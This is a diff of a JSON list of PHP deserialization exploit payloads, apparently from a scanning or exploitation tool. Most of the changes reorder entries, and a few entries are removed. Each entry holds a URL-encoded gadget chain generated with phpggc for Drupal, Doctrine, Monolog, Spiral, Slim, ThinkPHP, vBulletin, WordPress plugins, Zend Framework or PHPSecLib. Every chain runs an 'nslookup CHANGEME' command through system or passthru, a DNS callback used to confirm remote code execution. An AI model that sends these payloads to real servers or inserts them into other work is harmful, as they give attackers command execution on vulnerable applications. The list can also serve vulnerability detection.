@@ -55,18 +55,6 @@
   },
   {
     "_needs_dynamic_payload_editing": false,
-    "name": "Drupal 7.0.8 < ?",
-    "gen_with": "./phpggc Drupal7/RCE1 <function> <parameter>",
-    "payload": "O:11:\"SchemaCache\":4:{s:6:\"%00*%00cid\"%3Bs:14:\"form_DrupalRCE\"%3Bs:6:\"%00*%00bin\"%3Bs:10:\"cache_form\"%3Bs:16:\"%00*%00keysToPersist\"%3Ba:3:{s:8:\"#form_id\"%3Bb:1%3Bs:8:\"#process\"%3Bb:1%3Bs:9:\"#attached\"%3Bb:1%3B}s:10:\"%00*%00storage\"%3Ba:3:{s:8:\"#form_id\"%3Bs:9:\"DrupalRCE\"%3Bs:8:\"#process\"%3Ba:1:{i:0%3Bs:23:\"drupal_process_attached\"%3B}s:9:\"#attached\"%3Ba:1:{s:6:\"system\"%3Ba:1:{i:0%3Ba:1:{i:0%3Bs:63:\"nslookup CHANGEME\"%3B}}}}}"
-  },
-  {
-    "_needs_dynamic_payload_editing": false,
-    "name": "Drupal -8.9.6 <= 9.4.9+",
-    "gen_with": "./phpggc Drupal9/RCE1 <function> <parameter>",
-    "payload": "O:31:\"GuzzleHttp\\Cookie\\FileCookieJar\":1:{s:41:\"%00GuzzleHttp\\Cookie\\FileCookieJar%00filename\"%3BO:32:\"Laminas\\Diactoros\\RelativeStream\":1:{s:49:\"%00Laminas\\Diactoros\\RelativeStream%00decoratedStream\"%3BO:26:\"GuzzleHttp\\Psr7\\PumpStream\":2:{s:34:\"%00GuzzleHttp\\Psr7\\PumpStream%00source\"%3Bs:1:\"1\"%3Bs:34:\"%00GuzzleHttp\\Psr7\\PumpStream%00buffer\"%3BO:32:\"Drupal\\Core\\Config\\CachedStorage\":2:{s:10:\"%00*%00storage\"%3BO:32:\"Drupal\\Core\\Config\\MemoryStorage\":1:{s:13:\"%00*%00collection\"%3Bs:0:\"\"%3B}s:8:\"%00*%00cache\"%3BO:46:\"Drupal\\Component\\DependencyInjection\\Container\":1:{s:21:\"%00*%00serviceDefinitions\"%3Ba:1:{i:1000000%3Bs:132:\"a:2:{s:7:\"factory\"%3Bs:8:\"passthru\"%3Bs:9:\"arguments\"%3Ba:1:{i:0%3Bs:63:\"nslookup CHANGEME\"%3B}}\"%3B}}}}}}"
-  },
-  {
-    "_needs_dynamic_payload_editing": false,
     "name": "Doctrine/RCE1 1.5.1 <= 2.7.2",
     "gen_with": "./phpggc Doctrine/RCE1 <code>",
     "payload": "a:4:{i:1000%3BO:39:\"Doctrine\\Common\\Cache\\Psr6\\CacheAdapter\":3:{s:13:\"deferredItems\"%3Ba:1:{i:0%3BO:41:\"Doctrine\\Common\\Cache\\Psr6\\TypedCacheItem\":2:{s:6:\"expiry\"%3Bi:99999999999999999%3Bs:5:\"value\"%3Bs:4:\"test\"%3B}}s:6:\"loader\"%3Bi:1%3Bs:5:\"cache\"%3BO:71:\"Symfony\\Component\\HttpFoundation\\Session\\Storage\\MockFileSessionStorage\":5:{s:7:\"started\"%3Bb:1%3Bs:8:\"savePath\"%3Bs:4:\"/tmp\"%3Bs:2:\"id\"%3Bs:3:\"aaa\"%3Bs:4:\"data\"%3Ba:1:{i:0%3Bs:85:\"<?php passthru('nslookup CHANGEME')%3B ?>\"%3B}s:11:\"metadataBag\"%3BO:60:\"Symfony\\Component\\HttpFoundation\\Session\\Storage\\MetadataBag\":1:{s:10:\"storageKey\"%3Bs:1:\"a\"%3B}}}i:1000%3Bi:1%3Bi:2000%3BO:39:\"Doctrine\\Common\\Cache\\Psr6\\CacheAdapter\":3:{s:13:\"deferredItems\"%3Ba:1:{i:0%3BO:41:\"Doctrine\\Common\\Cache\\Psr6\\TypedCacheItem\":2:{s:6:\"expiry\"%3Bi:0%3Bs:5:\"value\"%3Bs:4:\"test\"%3B}}s:6:\"loader\"%3Bi:1%3Bs:5:\"cache\"%3BO:47:\"Symfony\\Component\\Cache\\Adapter\\PhpArrayAdapter\":1:{s:4:\"file\"%3Bs:17:\"/tmp/aaa.mocksess\"%3B}}i:2000%3Bi:1%3B}"
@@ -76,6 +64,18 @@
     "name": "Doctrine/RCE2 1.11.0 <= 2.3.2",
     "gen_with": "./phpggc Doctrine/RCE2 <function> <parameter>",
     "payload": "O:39:\"Doctrine\\Common\\Cache\\Psr6\\CacheAdapter\":2:{s:13:\"deferredItems\"%3Ba:1:{i:0%3BO:41:\"Symfony\\Component\\Cache\\Traits\\RedisProxy\":2:{s:5:\"redis\"%3Bs:63:\"nslookup CHANGEME\"%3Bs:11:\"initializer\"%3BO:61:\"Doctrine\\Bundle\\DoctrineBundle\\Dbal\\SchemaAssetsFilterManager\":1:{s:18:\"schemaAssetFilters\"%3Ba:1:{i:0%3Bs:8:\"passthru\"%3B}}}}s:6:\"loader\"%3Bi:1%3B}"
+  },
+  {
+    "_needs_dynamic_payload_editing": false,
+    "name": "Drupal 7.0.8 < ?",
+    "gen_with": "./phpggc Drupal7/RCE1 <function> <parameter>",
+    "payload": "O:11:\"SchemaCache\":4:{s:6:\"%00*%00cid\"%3Bs:14:\"form_DrupalRCE\"%3Bs:6:\"%00*%00bin\"%3Bs:10:\"cache_form\"%3Bs:16:\"%00*%00keysToPersist\"%3Ba:3:{s:8:\"#form_id\"%3Bb:1%3Bs:8:\"#process\"%3Bb:1%3Bs:9:\"#attached\"%3Bb:1%3B}s:10:\"%00*%00storage\"%3Ba:3:{s:8:\"#form_id\"%3Bs:9:\"DrupalRCE\"%3Bs:8:\"#process\"%3Ba:1:{i:0%3Bs:23:\"drupal_process_attached\"%3B}s:9:\"#attached\"%3Ba:1:{s:6:\"system\"%3Ba:1:{i:0%3Ba:1:{i:0%3Bs:63:\"nslookup CHANGEME\"%3B}}}}}"
+  },
+  {
+    "_needs_dynamic_payload_editing": false,
+    "name": "Drupal -8.9.6 <= 9.4.9+",
+    "gen_with": "./phpggc Drupal9/RCE1 <function> <parameter>",
+    "payload": "O:31:\"GuzzleHttp\\Cookie\\FileCookieJar\":1:{s:41:\"%00GuzzleHttp\\Cookie\\FileCookieJar%00filename\"%3BO:32:\"Laminas\\Diactoros\\RelativeStream\":1:{s:49:\"%00Laminas\\Diactoros\\RelativeStream%00decoratedStream\"%3BO:26:\"GuzzleHttp\\Psr7\\PumpStream\":2:{s:34:\"%00GuzzleHttp\\Psr7\\PumpStream%00source\"%3Bs:1:\"1\"%3Bs:34:\"%00GuzzleHttp\\Psr7\\PumpStream%00buffer\"%3BO:32:\"Drupal\\Core\\Config\\CachedStorage\":2:{s:10:\"%00*%00storage\"%3BO:32:\"Drupal\\Core\\Config\\MemoryStorage\":1:{s:13:\"%00*%00collection\"%3Bs:0:\"\"%3B}s:8:\"%00*%00cache\"%3BO:46:\"Drupal\\Component\\DependencyInjection\\Container\":1:{s:21:\"%00*%00serviceDefinitions\"%3Ba:1:{i:1000000%3Bs:132:\"a:2:{s:7:\"factory\"%3Bs:8:\"passthru\"%3Bs:9:\"arguments\"%3Ba:1:{i:0%3Bs:63:\"nslookup CHANGEME\"%3B}}\"%3B}}}}}}"
   },
   {
     "_needs_dynamic_payload_editing": false,
@@ -187,18 +187,6 @@
   },
   {
     "_needs_dynamic_payload_editing": false,
-    "name": "Spiral 2.7.0 <= 2.8.13 (1)",
-    "gen_with": "./phpggc Spiral/RCE1 <function> <parameter>",
-    "payload": "O:35:\"Monolog\\Handler\\RotatingFileHandler\":4:{s:13:\"%00*%00mustRotate\"%3Bb:1%3Bs:11:\"%00*%00filename\"%3Bs:8:\"anything\"%3Bs:17:\"%00*%00filenameFormat\"%3BO:30:\"Spiral\\Reactor\\FileDeclaration\":1:{s:42:\"%00Spiral\\Reactor\\FileDeclaration%00docComment\"%3BO:20:\"PhpOption\\LazyOption\":2:{s:30:\"%00PhpOption\\LazyOption%00callback\"%3Bs:8:\"passthru\"%3Bs:31:\"%00PhpOption\\LazyOption%00arguments\"%3Ba:1:{i:0%3Bs:63:\"nslookup CHANGEME\"%3B}}}s:13:\"%00*%00dateFormat\"%3Bs:1:\"l\"%3B}"
-  },
-  {
-    "_needs_dynamic_payload_editing": false,
-    "name": "Spiral -2.8+ (2)",
-    "gen_with": "./phpggc Spiral/RCE2 <function> <parameter>",
-    "payload": "O:7:\"App\\App\":1:{s:12:\"%00*%00finalizer\"%3BO:21:\"Spiral\\Boot\\Finalizer\":1:{s:33:\"%00Spiral\\Boot\\Finalizer%00finalizers\"%3Ba:1:{i:0%3Ba:2:{i:0%3BO:20:\"PhpOption\\LazyOption\":2:{s:30:\"%00PhpOption\\LazyOption%00callback\"%3Bs:8:\"passthru\"%3Bs:31:\"%00PhpOption\\LazyOption%00arguments\"%3Ba:1:{i:0%3Bs:63:\"nslookup CHANGEME\"%3B}}i:1%3Bs:3:\"get\"%3B}}}}"
-  },
-  {
-    "_needs_dynamic_payload_editing": false,
     "name": "Monolog 1.4.1 <= 1.6.0 1.17.2 <= 2.7.0+ (1)",
     "gen_with": "./phpggc Monolog/RCE1 <function> <parameter>",
     "payload": "O:32:\"Monolog\\Handler\\SyslogUdpHandler\":1:{s:9:\"%00*%00socket\"%3BO:29:\"Monolog\\Handler\\BufferHandler\":7:{s:10:\"%00*%00handler\"%3Br:2%3Bs:13:\"%00*%00bufferSize\"%3Bi:-1%3Bs:9:\"%00*%00buffer\"%3Ba:1:{i:0%3Ba:2:{i:0%3Bs:63:\"nslookup CHANGEME\"%3Bs:5:\"level\"%3BN%3B}}s:8:\"%00*%00level\"%3BN%3Bs:14:\"%00*%00initialized\"%3Bb:1%3Bs:14:\"%00*%00bufferLimit\"%3Bi:-1%3Bs:13:\"%00*%00processors\"%3Ba:2:{i:0%3Bs:7:\"current\"%3Bi:1%3Bs:6:\"system\"%3B}}}"
@@ -275,6 +263,19 @@
     "gen_with": "./phpggc Slim/RCE1 <function> <parameter>",
     "payload": "O:18:\"Slim\\Http\\Response\":2:{s:10:\"%00*%00headers\"%3BO:8:\"Slim\\App\":1:{s:19:\"%00Slim\\App%00container\"%3BO:14:\"Slim\\Container\":3:{s:21:\"%00Pimple\\Container%00raw\"%3Ba:1:{s:3:\"all\"%3Ba:2:{i:0%3BO:8:\"Slim\\App\":1:{s:19:\"%00Slim\\App%00container\"%3BO:8:\"Slim\\App\":1:{s:19:\"%00Slim\\App%00container\"%3BO:14:\"Slim\\Container\":3:{s:21:\"%00Pimple\\Container%00raw\"%3Ba:1:{s:3:\"has\"%3Bs:6:\"system\"%3B}s:24:\"%00Pimple\\Container%00values\"%3Ba:1:{s:3:\"has\"%3Bs:6:\"system\"%3B}s:22:\"%00Pimple\\Container%00keys\"%3Ba:1:{s:3:\"has\"%3Bs:6:\"system\"%3B}}}}i:1%3Bs:63:\"nslookup CHANGEME\"%3B}}s:24:\"%00Pimple\\Container%00values\"%3Ba:1:{s:3:\"all\"%3Ba:2:{i:0%3BO:8:\"Slim\\App\":1:{s:19:\"%00Slim\\App%00container\"%3BO:8:\"Slim\\App\":1:{s:19:\"%00Slim\\App%00container\"%3BO:14:\"Slim\\Container\":3:{s:21:\"%00Pimple\\Container%00raw\"%3Ba:1:{s:3:\"has\"%3Bs:6:\"system\"%3B}s:24:\"%00Pimple\\Container%00values\"%3Ba:1:{s:3:\"has\"%3Bs:6:\"system\"%3B}s:22:\"%00Pimple\\Container%00keys\"%3Ba:1:{s:3:\"has\"%3Bs:6:\"system\"%3B}}}}i:1%3Bs:63:\"nslookup CHANGEME\"%3B}}s:22:\"%00Pimple\\Container%00keys\"%3Ba:1:{s:3:\"all\"%3Ba:2:{i:0%3BO:8:\"Slim\\App\":1:{s:19:\"%00Slim\\App%00container\"%3BO:8:\"Slim\\App\":1:{s:19:\"%00Slim\\App%00container\"%3BO:14:\"Slim\\Container\":3:{s:21:\"%00Pimple\\Container%00raw\"%3Ba:1:{s:3:\"has\"%3Bs:6:\"system\"%3B}s:24:\"%00Pimple\\Container%00values\"%3Ba:1:{s:3:\"has\"%3Bs:6:\"system\"%3B}s:22:\"%00Pimple\\Container%00keys\"%3Ba:1:{s:3:\"has\"%3Bs:6:\"system\"%3B}}}}i:1%3Bs:63:\"nslookup CHANGEME\"%3B}}}}s:7:\"%00*%00body\"%3Bs:0:\"\"%3B}"
   },
+  
+  {
+    "_needs_dynamic_payload_editing": false,
+    "name": "Spiral 2.7.0 <= 2.8.13 (1)",
+    "gen_with": "./phpggc Spiral/RCE1 <function> <parameter>",
+    "payload": "O:35:\"Monolog\\Handler\\RotatingFileHandler\":4:{s:13:\"%00*%00mustRotate\"%3Bb:1%3Bs:11:\"%00*%00filename\"%3Bs:8:\"anything\"%3Bs:17:\"%00*%00filenameFormat\"%3BO:30:\"Spiral\\Reactor\\FileDeclaration\":1:{s:42:\"%00Spiral\\Reactor\\FileDeclaration%00docComment\"%3BO:20:\"PhpOption\\LazyOption\":2:{s:30:\"%00PhpOption\\LazyOption%00callback\"%3Bs:8:\"passthru\"%3Bs:31:\"%00PhpOption\\LazyOption%00arguments\"%3Ba:1:{i:0%3Bs:63:\"nslookup CHANGEME\"%3B}}}s:13:\"%00*%00dateFormat\"%3Bs:1:\"l\"%3B}"
+  },
+  {
+    "_needs_dynamic_payload_editing": false,
+    "name": "Spiral -2.8+ (2)",
+    "gen_with": "./phpggc Spiral/RCE2 <function> <parameter>",
+    "payload": "O:7:\"App\\App\":1:{s:12:\"%00*%00finalizer\"%3BO:21:\"Spiral\\Boot\\Finalizer\":1:{s:33:\"%00Spiral\\Boot\\Finalizer%00finalizers\"%3Ba:1:{i:0%3Ba:2:{i:0%3BO:20:\"PhpOption\\LazyOption\":2:{s:30:\"%00PhpOption\\LazyOption%00callback\"%3Bs:8:\"passthru\"%3Bs:31:\"%00PhpOption\\LazyOption%00arguments\"%3Ba:1:{i:0%3Bs:63:\"nslookup CHANGEME\"%3B}}i:1%3Bs:3:\"get\"%3B}}}}"
+  },
   {
     "_needs_dynamic_payload_editing": false,
     "name": "Symfony v3.1.0 <= v3.4.34 (1)",
@@ -348,6 +349,12 @@
     "payload": "O:17:\"think\\model\\Pivot\":9:{s:19:\"%00think\\Model%00exists\"%3Bb:1%3Bs:18:\"%00think\\Model%00force\"%3Bb:1%3Bs:21:\"%00think\\Model%00lazySave\"%3Bb:1%3Bs:9:\"%00*%00suffix\"%3BO:17:\"think\\model\\Pivot\":9:{s:19:\"%00think\\Model%00exists\"%3BN%3Bs:18:\"%00think\\Model%00force\"%3BN%3Bs:21:\"%00think\\Model%00lazySave\"%3BN%3Bs:9:\"%00*%00suffix\"%3BN%3Bs:17:\"%00think\\Model%00data\"%3Ba:1:{s:3:\"key\"%3Ba:1:{s:3:\"key\"%3Bs:63:\"nslookup CHANGEME\"%3B}}s:21:\"%00think\\Model%00withAttr\"%3Ba:1:{s:3:\"key\"%3Ba:1:{s:3:\"key\"%3Bs:8:\"passthru\"%3B}}s:7:\"%00*%00json\"%3Ba:1:{i:0%3Bs:3:\"key\"%3B}s:12:\"%00*%00jsonAssoc\"%3Bb:1%3Bs:12:\"%00*%00withEvent\"%3BN%3B}s:17:\"%00think\\Model%00data\"%3Ba:1:{s:3:\"key\"%3Ba:1:{s:3:\"key\"%3Bs:63:\"nslookup CHANGEME\"%3B}}s:21:\"%00think\\Model%00withAttr\"%3BN%3Bs:7:\"%00*%00json\"%3BN%3Bs:12:\"%00*%00jsonAssoc\"%3BN%3Bs:12:\"%00*%00withEvent\"%3Bb:0%3B}"
   },
   {
+  "_needs_dynamic_payload_editing": false,
+  "name": "vBulletin ??? (1)",
+  "gen_with": "./phpggc vBulletin/RCE1 <function> <parameter>",
+  "payload": "a:2:{i:0%3BO:27:\"googlelogin_vendor_autoload\":0:{}i:1%3BO:32:\"Monolog\\Handler\\SyslogUdpHandler\":1:{s:9:\"%00*%00socket\"%3BO:29:\"Monolog\\Handler\\BufferHandler\":7:{s:10:\"%00*%00handler\"%3Br:4%3Bs:13:\"%00*%00bufferSize\"%3Bi:-1%3Bs:9:\"%00*%00buffer\"%3Ba:1:{i:0%3Ba:2:{i:0%3Bs:63:\"nslookup CHANGEME\"%3Bs:5:\"level\"%3BN%3B}}s:8:\"%00*%00level\"%3BN%3Bs:14:\"%00*%00initialized\"%3Bb:1%3Bs:14:\"%00*%00bufferLimit\"%3Bi:-1%3Bs:13:\"%00*%00processors\"%3Ba:2:{i:0%3Bs:7:\"current\"%3Bi:1%3Bs:8:\"passthru\"%3B}}}}"
+  },
+  {
     "_needs_dynamic_payload_editing": false,
     "name": "WordPress/Dompdf/RCE1 <= 0.8.5+ (1)",
     "gen_with": "./phpggc WordPress/Dompdf/RCE1 <function> <parameter>",
@@ -382,7 +389,6 @@
     "name": "WordPress/P/EverestForms/RCE1 1.0 <= 1.6.7+ (1)",
     "gen_with": "./phpggc WordPress/P/EverestForms/RCE1 <function> <parameter>",
     "payload": "O:20:\"EVF_Log_Handler_File\":1:{s:10:\"%00*%00handles\"%3BO:33:\"Requests_Utility_FilteredIterator\":4:{i:0%3Bi:0%3Bi:1%3Ba:1:{i:0%3Bs:63:\"nslookup CHANGEME\"%3B}i:2%3Ba:1:{s:11:\"%00*%00callback\"%3Bs:6:\"system\"%3B}i:3%3BN%3B}}"
-
   },
   {
     "_needs_dynamic_payload_editing": false,
@@ -485,23 +491,5 @@
     "name": "ZendFramework 2.0.1 <= ? (5)",
     "gen_with": "./phpggc ZendFramework/RCE5 <function> <parameter>",
     "payload": "O:33:\"Zend\\Cache\\Storage\\Adapter\\Memory\":2:{s:15:\"%00*%00eventHandles\"%3Ba:1:{i:0%3Bi:1%3B}s:9:\"%00*%00events\"%3BO:30:\"Zend\\View\\Renderer\\PhpRenderer\":1:{s:41:\"%00Zend\\View\\Renderer\\PhpRenderer%00__helpers\"%3BO:37:\"Zend\\Tag\\Cloud\\DecoratorPluginManager\":4:{s:17:\"%00*%00canonicalNames\"%3Ba:2:{s:6:\"detach\"%3Bs:5:\"cname\"%3Bs:5:\"cname\"%3Bs:3:\"any\"%3B}s:19:\"%00*%00invokableClasses\"%3Ba:1:{s:5:\"cname\"%3Bs:37:\"Zend\\Tag\\Cloud\\DecoratorPluginManager\"%3B}s:34:\"%00*%00retrieveFromPeeringManagerFirst\"%3Bb:0%3Bs:15:\"%00*%00initializers\"%3Ba:1:{i:0%3BO:23:\"Zend\\Filter\\FilterChain\":1:{s:10:\"%00*%00filters\"%3BO:13:\"SplFixedArray\":2:{i:0%3Ba:2:{i:0%3BO:14:\"Zend\\Json\\Expr\":1:{s:13:\"%00*%00expression\"%3Bs:63:\"nslookup CHANGEME\"%3B}i:1%3Bs:10:\"__toString\"%3B}i:1%3Bs:6:\"system\"%3B}}}}}}"
-  },
-  {
-    "_needs_dynamic_payload_editing": false,
-    "name": "ZendFramework ? <= 1.12.20 (4)",
-    "gen_with": "./phpggc ZendFramework/RCE4 <php-code>",
-    "payload": "O:8:\"Zend_Log\":1:{s:11:\"%00*%00_writers\"%3Ba:1:{i:0%3BO:20:\"Zend_Log_Writer_Mail\":5:{s:16:\"%00*%00_eventsToMail\"%3Ba:1:{i:0%3Bi:1%3B}s:22:\"%00*%00_layoutEventsToMail\"%3Ba:0:{}s:8:\"%00*%00_mail\"%3BO:9:\"Zend_Mail\":0:{}s:10:\"%00*%00_layout\"%3BO:11:\"Zend_Layout\":3:{s:13:\"%00*%00_inflector\"%3BO:21:\"Zend_Filter_Inflector\":1:{s:9:\"%00*%00_rules\"%3Ba:1:{s:6:\"script\"%3Ba:1:{i:0%3BO:20:\"Zend_Filter_Callback\":2:{s:12:\"%00*%00_callback\"%3Bs:15:\"create_function\"%3Bs:11:\"%00*%00_options\"%3Ba:1:{i:0%3Bs:0:\"\"%3B}}}}}s:20:\"%00*%00_inflectorEnabled\"%3Bb:1%3Bs:10:\"%00*%00_layout\"%3Bs:81:\"){}passthru('nslookup CHANGEME')%3B/*\"%3B}s:22:\"%00*%00_subjectPrependText\"%3BN%3B}}}"
-  },
-  {
-  "_needs_dynamic_payload_editing": false,
-  "name": "PHPSecLib 2.0.0 <= 2.0.34 (1)",
-  "gen_with": "./phpggc PHPSecLib/RCE1 <php-code>",
-  "payload": "a:1:{i:0%3BO:18:\"phpseclib\\Net\\SSH1\":2:{s:6:\"bitmap\"%3Bi:1%3Bs:6:\"crypto\"%3BO:19:\"phpseclib\\Crypt\\AES\":8:{s:6:\"bitmap\"%3Bi:1%3Bs:6:\"crypto\"%3Bi:1%3Bs:10:\"block_size\"%3BN%3Bs:12:\"inline_crypt\"%3Ba:2:{i:0%3BO:25:\"phpseclib\\Crypt\\TripleDES\":6:{s:10:\"block_size\"%3Bs:113:\"1){}}}%3B ob_clean()%3Bpassthru('nslookup CHANGEME')%3Bdie()%3B ?>\"%3Bs:12:\"inline_crypt\"%3BN%3Bs:16:\"use_inline_crypt\"%3Bi:1%3Bs:7:\"changed\"%3Bi:0%3Bs:6:\"engine\"%3Bi:1%3Bs:4:\"mode\"%3Bi:1%3B}i:1%3Bs:26:\"_createInlineCryptFunction\"%3B}s:16:\"use_inline_crypt\"%3Bi:1%3Bs:7:\"changed\"%3Bi:0%3Bs:6:\"engine\"%3Bi:1%3Bs:4:\"mode\"%3Bi:1%3B}}}"
-  },
-  {
-  "_needs_dynamic_payload_editing": false,
-  "name": "vBulletin ??? (1)",
-  "gen_with": "./phpggc vBulletin/RCE1 <function> <parameter>",
-  "payload": "a:2:{i:0%3BO:27:\"googlelogin_vendor_autoload\":0:{}i:1%3BO:32:\"Monolog\\Handler\\SyslogUdpHandler\":1:{s:9:\"%00*%00socket\"%3BO:29:\"Monolog\\Handler\\BufferHandler\":7:{s:10:\"%00*%00handler\"%3Br:4%3Bs:13:\"%00*%00bufferSize\"%3Bi:-1%3Bs:9:\"%00*%00buffer\"%3Ba:1:{i:0%3Ba:2:{i:0%3Bs:63:\"nslookup CHANGEME\"%3Bs:5:\"level\"%3BN%3B}}s:8:\"%00*%00level\"%3BN%3Bs:14:\"%00*%00initialized\"%3Bb:1%3Bs:14:\"%00*%00bufferLimit\"%3Bi:-1%3Bs:13:\"%00*%00processors\"%3Ba:2:{i:0%3Bs:7:\"current\"%3Bi:1%3Bs:8:\"passthru\"%3B}}}}"
   }
 ]
